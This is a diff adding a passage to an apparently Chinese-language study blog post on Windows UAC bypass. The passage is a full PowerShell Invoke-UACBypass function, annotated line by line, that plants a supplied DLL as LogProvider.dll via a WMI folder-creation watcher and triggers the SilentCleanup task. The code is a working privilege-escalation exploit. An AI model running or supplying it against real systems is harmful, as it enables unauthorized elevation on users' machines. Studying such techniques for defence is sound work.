@@ -423,6 +423,110 @@
 <p>经过额外测试后，此技术不适用于标准用户帐户，因为 cleanmgr.exe 不会将任何文件提取到 %TEMP%。当以低或中等完整性作为标准用户执行时，任务以中等完整性运行，并且永远不会超过该值（标准用户相当于普通登录用户，证明这个操作在大多数用户机上都可以操作，实用性很高）</p>
 <p>文章后面的内容就不多做复述，下面就是分析文章链接中给的Powershell用c#写的脚本。</p>
 <h3 id="0x1-2-UACBypass脚本分析学习"><a href="#0x1-2-UACBypass脚本分析学习" class="headerlink" title="0x1-2 UACBypass脚本分析学习"></a>0x1-2 UACBypass脚本分析学习</h3><p>我没有学习过PowerShell脚本和C#，所以是现学现了解（感觉这种学习方法是比较最高效，一个知识面引申出其他的知识面，让自己一直主动的吸取知识）</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token keyword">function</span> <span class="token function">Invoke-UACBypass</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token namespace">[CmdletBinding()]</span>                   <span class="token comment">#类似头文件一样 一般都会写一个 让脚本可以使用很多高级函数 公共参数 通过微软的about_functions_advanced_parameters学习</span>
+    <span class="token namespace">[OutputType([System.IO.FileInfo])]</span>  <span class="token comment">#OutputType[指定对象类型] System.IO.FileInfo 提供对文件的操作</span>
+    <span class="token keyword">Param</span> <span class="token punctuation">(</span>
+        <span class="token namespace">[Parameter(Mandatory = $True)]</span>  <span class="token comment">#Parameter 属性是声明参数时的唯一一个必需属性</span>
+        <span class="token namespace">[String]</span>
+        <span class="token namespace">[ValidateScript(&#123; Test-Path $_ &#125;)]</span>   <span class="token comment">#ValidateScript 属性指定用于对形式参数的实际参数进行验证的脚本   Test-Path 是检测路径参数是否都在</span>
+        <span class="token variable">$DllPath</span>                             <span class="token comment">#参数就是DLLpath 代码效果就是检测DLLpath路径参数是不是都在</span>
+    <span class="token punctuation">)</span>
+
+    <span class="token variable">$PrivescAction</span> = <span class="token punctuation">&#123;</span>
+        <span class="token variable">$ReplacementDllPath</span> = <span class="token variable">$Event</span><span class="token punctuation">.</span>MessageData<span class="token punctuation">.</span>DllPath    <span class="token comment">#获得DLLPath的信息输出区</span>
+        <span class="token comment"># The newly created GUID folder</span>
+        <span class="token variable">$DismHostFolder</span> = <span class="token variable">$EventArgs</span><span class="token punctuation">.</span>NewEvent<span class="token punctuation">.</span>TargetInstance<span class="token punctuation">.</span>Name   <span class="token comment">#新建一个目标实例名字 对应操作中的新建 GUID 文件夹</span>
+        
+        <span class="token variable">$OriginalPreference</span> = <span class="token variable">$VerbosePreference</span>                    <span class="token comment">#把我们默认的输出参数保存起来 所以左边命名成了 Original 因为后面需要改变 Verbose的值</span>
+
+        <span class="token comment"># Force -Verbose to display in the event</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Event</span><span class="token punctuation">.</span>MessageData<span class="token punctuation">.</span>VerboseSet <span class="token operator">-eq</span> <span class="token boolean">$True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token comment">#强制让事件显示</span>
+            <span class="token variable">$VerbosePreference</span> = <span class="token string">'Continue'</span>                         
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token function">Write-Verbose</span> <span class="token string">"DismHost folder created in <span class="token variable">$DismHostFolder</span>"</span>              <span class="token comment">#输出 GUID文件夹名字</span>
+        <span class="token function">Write-Verbose</span> <span class="token string">"<span class="token variable">$ReplacementDllPath</span> to <span class="token variable">$DismHostFolder</span>\LogProvider.dll"</span>  <span class="token comment">#输出 DLLPath的dll 复制到 GUID文件夹里面中的LogProvider.dll中</span>
+            
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$FileInfo</span> = <span class="token function">Copy-Item</span> <span class="token operator">-</span>Path <span class="token variable">$ReplacementDllPath</span> <span class="token operator">-</span>Destination <span class="token string">"<span class="token variable">$DismHostFolder</span>\LogProvider.dll"</span> <span class="token operator">-</span>Force <span class="token operator">-</span>PassThru <span class="token operator">-</span>ErrorAction Stop  <span class="token comment">#复制DLL到指定的文件夹</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">Write-Warning</span> <span class="token string">"Error copying file! Message: <span class="token variable">$_</span>"</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token comment"># Restore the event preference</span>
+        <span class="token variable">$VerbosePreference</span> = <span class="token variable">$OriginalPreference</span>            <span class="token comment">#恢复输出默认值</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$FileInfo</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token comment"># Trigger Wait-Event to return and indicate success.</span>
+            <span class="token function">New-Event</span> <span class="token operator">-</span>SourceIdentifier <span class="token string">'DllPlantedSuccess'</span> <span class="token operator">-</span>MessageData <span class="token variable">$FileInfo</span>    <span class="token comment">#判断上面的复制有没有成功，成功就启动wait_event</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token variable">$VerboseSet</span> = <span class="token boolean">$False</span>        <span class="token comment">#关闭Verbose</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PSBoundParameters</span><span class="token punctuation">[</span><span class="token string">'Verbose'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$VerboseSet</span> = <span class="token boolean">$True</span> <span class="token punctuation">&#125;</span> <span class="token comment">#PSBoundParameters 获取命令行的参数 然后存成python中字典一样 key 和 value对应  这里就是判断Verbose里面的value 成功就把Verbose开启</span>
+
+    <span class="token variable">$MessageData</span> = <span class="token function">New-Object</span> <span class="token operator">-</span>TypeName PSObject <span class="token operator">-</span>Property @<span class="token punctuation">&#123;</span>    <span class="token comment"># 创建一个PSobject</span>
+        DllPath = <span class="token variable">$DllPath</span>
+        VerboseSet = <span class="token variable">$VerboseSet</span> <span class="token comment"># Pass the verbose preference to the scriptblock since 将详细参数首选项传递给脚本块since</span>
+                                 <span class="token comment"># event scriptblocks will not automatically honor -Verbose. 事件脚本块将不会自动执行-Verbose</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token variable">$TempDrive</span> = <span class="token variable">$Env</span>:TEMP<span class="token punctuation">.</span>Substring<span class="token punctuation">(</span>0<span class="token punctuation">,</span>2<span class="token punctuation">)</span>           <span class="token comment">#获取环境变量TEMP0-2的字符串</span>
+
+    <span class="token comment"># Trigger the DLL dropper with the following conditions:           用以下条件触发DLL</span>
+    <span class="token comment">#  1) A directory is created - i.e. new Win32_Directory instance   创建一个目录-即新的Win32_Directory实例</span>
+    <span class="token comment">#  2) The directory created is created under %TEMP%                创建的目录在%TEMP%下创建</span>
+    <span class="token comment">#  3) The directory name is in the form of a GUID                  目录名采用GUID的形式</span>
+    <span class="token variable">$TempFolderCreationEvent</span> = <span class="token string">"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA `"Win32_Directory`" AND TargetInstance.Drive = `"<span class="token variable">$TempDrive</span>`" AND TargetInstance.Path = `"<span class="token function">$<span class="token punctuation">(</span><span class="token variable">$Env</span>:TEMP<span class="token punctuation">.</span>Substring<span class="token punctuation">(</span>2<span class="token punctuation">)</span></span>.Replace('\', '\\'))\\`" AND TargetInstance.FileName LIKE `"________-____-____-____-____________`""</span>
+    
+    <span class="token variable">$TempFolderWatcher</span> = <span class="token function">Register-WmiEvent</span> <span class="token operator">-</span>Query <span class="token variable">$TempFolderCreationEvent</span> <span class="token operator">-</span>Action <span class="token variable">$PrivescAction</span> <span class="token operator">-</span>MessageData <span class="token variable">$MessageData</span>  <span class="token comment">#注册一个WMI事件 名字分配一个GUID 指定一个WMI类的命名空间</span>
+
+    <span class="token comment"># We need to jump through these hoops to properly capture stdout and stderr of schtasks.</span>
+    <span class="token variable">$StartInfo</span> = <span class="token function">New-Object</span> Diagnostics<span class="token punctuation">.</span>ProcessStartInfo
+    <span class="token variable">$StartInfo</span><span class="token punctuation">.</span>FileName = <span class="token string">'schtasks'</span>
+    <span class="token variable">$StartInfo</span><span class="token punctuation">.</span>Arguments = <span class="token string">'/Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I'</span>
+    <span class="token variable">$StartInfo</span><span class="token punctuation">.</span>RedirectStandardError = <span class="token boolean">$True</span>
+    <span class="token variable">$StartInfo</span><span class="token punctuation">.</span>RedirectStandardOutput = <span class="token boolean">$True</span>
+    <span class="token variable">$StartInfo</span><span class="token punctuation">.</span>UseShellExecute = <span class="token boolean">$False</span>
+    <span class="token variable">$Process</span> = <span class="token function">New-Object</span> Diagnostics<span class="token punctuation">.</span><span class="token keyword">Process</span>
+    <span class="token variable">$Process</span><span class="token punctuation">.</span>StartInfo = <span class="token variable">$StartInfo</span>
+    <span class="token variable">$null</span> = <span class="token variable">$Process</span><span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token variable">$Process</span><span class="token punctuation">.</span>WaitForExit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token variable">$Stdout</span> = <span class="token variable">$Process</span><span class="token punctuation">.</span>StandardOutput<span class="token punctuation">.</span>ReadToEnd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Trim<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token variable">$Stderr</span> = <span class="token variable">$Process</span><span class="token punctuation">.</span>StandardError<span class="token punctuation">.</span>ReadToEnd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Trim<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Stderr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">Unregister-Event</span> <span class="token operator">-</span>SubscriptionId <span class="token variable">$TempFolderWatcher</span><span class="token punctuation">.</span>Id
+        <span class="token keyword">throw</span> <span class="token string">"SilentCleanup task failed to execute. Error message: <span class="token variable">$Stderr</span>"</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Stdout</span><span class="token punctuation">.</span>Contains<span class="token punctuation">(</span><span class="token string">'is currently running'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">Unregister-Event</span> <span class="token operator">-</span>SubscriptionId <span class="token variable">$TempFolderWatcher</span><span class="token punctuation">.</span>Id
+            <span class="token function">Write-Warning</span> <span class="token string">'SilentCleanup task is already running. Please wait until the task has completed.'</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token function">Write-Verbose</span> <span class="token string">"SilentCleanup task executed successfully. Message: <span class="token variable">$Stdout</span>"</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token variable">$PayloadExecutedEvent</span> = <span class="token function">Wait-Event</span> <span class="token operator">-</span>SourceIdentifier <span class="token string">'DllPlantedSuccess'</span> <span class="token operator">-</span>Timeout 10
+
+    <span class="token function">Unregister-Event</span> <span class="token operator">-</span>SubscriptionId <span class="token variable">$TempFolderWatcher</span><span class="token punctuation">.</span>Id
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PayloadExecutedEvent</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">Write-Verbose</span> <span class="token string">'UAC bypass was successful!'</span>
+
+        <span class="token comment"># Output the file info for the DLL that was planted</span>
+        <span class="token variable">$PayloadExecutedEvent</span><span class="token punctuation">.</span>MessageData
+
+        <span class="token variable">$PayloadExecutedEvent</span> <span class="token punctuation">|</span> <span class="token function">Remove-Event</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment"># The event timed out.</span>
+        <span class="token function">Write-Error</span> <span class="token string">'UAC bypass failed. The DLL was not planted in its target.'</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
